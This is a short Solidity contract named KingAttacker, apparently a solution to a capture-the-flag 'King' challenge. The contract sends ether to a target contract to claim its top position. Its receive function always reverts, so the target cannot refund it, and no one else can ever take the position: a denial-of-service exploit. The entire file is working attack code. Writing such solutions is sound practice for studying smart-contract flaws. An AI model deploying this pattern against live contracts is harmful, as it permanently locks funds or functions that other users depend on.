// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttacker {
    address payable addr;

    constructor(address payable _addr) {
        addr = _addr;
    }

    function sendToKing() external payable {
        (bool success, ) = addr.call{value: msg.value}("");
        require(success);
    }

    receive() external payable {
        revert();
    }
}
